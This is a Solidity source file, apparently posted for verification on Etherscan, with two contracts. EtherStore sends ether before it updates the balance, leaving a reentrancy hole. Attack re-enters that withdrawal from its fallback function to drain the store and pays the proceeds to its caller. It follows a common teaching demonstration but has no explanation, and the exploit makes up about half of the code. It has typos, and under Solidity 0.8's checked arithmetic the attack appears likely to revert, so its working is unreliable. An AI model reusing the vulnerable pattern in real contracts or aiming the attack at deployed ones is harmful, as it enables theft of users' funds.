/**
 *Submitted for verification at Etherscan.io on 2021-11-15
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.3;

contract EtherStore {
    
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;
    
    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdrawaFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        require(_weiToWithdraw <= withdrawalLimit);
        require(block.timestamp>=lastWithdrawTime[msg.sender]+1 hours );
        (bool booldata, bytes memory bytesdata) = msg.sender.call{value : _weiToWithdraw}("");
        require(booldata);
        
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender]=block.timestamp;
    }
}

contract Attack {
    EtherStore public etherstore;
    
    constructor(address _etherStoreAddress){
    etherstore = EtherStore(_etherStoreAddress);
}

function atttackEtherStore() public payable{
    require(msg.value >= 1 ether);
    etherstore.depositFunds{value : 1 ether}();
    etherstore.withdrawaFunds(1000000000000000000);
}

function collectEther() public{
    payable(msg.sender).transfer(address(this).balance);
}

fallback() external payable{
    if(address(etherstore).balance > 1 ether) {
        etherstore.withdrawaFunds (1000000000000000000);
    }
}


}